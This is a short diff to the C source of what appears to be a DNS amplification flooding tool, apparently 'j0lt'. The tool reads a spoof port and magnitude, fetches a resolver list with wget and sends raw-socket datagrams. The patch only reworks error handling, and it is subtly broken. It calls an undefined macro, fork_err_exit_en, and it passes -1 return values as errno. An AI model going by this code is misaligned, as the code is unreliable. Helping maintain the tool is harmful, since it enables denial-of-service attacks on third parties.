@@ -166,6 +166,11 @@ DEFINE_INSERT_FN(qword, uint64_t)
 #define     fork_err_exit(msg) do { perror(msg); \
                                     _exit(EXIT_FAILURE); \
                                     } while (0)
+
+#define     err_exit_en(en, msg) do { errno = en; perror(msg); \
+                                    exit(EXIT_FAILURE); \
+                                    } while (0)
+
 // IP HEADER VALUES
 #define     IP_IHL_MIN_J0LT 5
 #define     IP_IHL_MAX_J0LT 15
@@ -253,10 +258,10 @@ main(int argc, char** argv)
     spoofport = ( uint16_t ) strtol(argv[ 2 ], NULL, 0);
     magnitude = ( uint16_t ) strtol(argv[ 3 ], NULL, 0);
     if (errno != 0)
-        err_exit("* spoof port or mgnituted incorrect");
+        err_exit_en(errno, "* spoof port or mgnituted incorrect");
 
     if ((pid = fork( )) < 0)
-        fork_err_exit("* forking child process failed\n");
+        fork_err_exit_en(pid, "* forking child process failed\n");
     else if (pid == 0) {
         if (execv(*g_wget, g_wget) < 0)
             fork_err_exit("* exec failed");
@@ -503,7 +508,7 @@ SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t n
     if (raw_sockfd == -1) {
         remove(g_path);
         printf("- resolv list removed from %s\n", g_path);
-        err_exit("* fatal socket error");
+        err_exit_en(raw_sockfd, "* fatal socket error");
     }
 
     addr.sin_family = AF_INET;
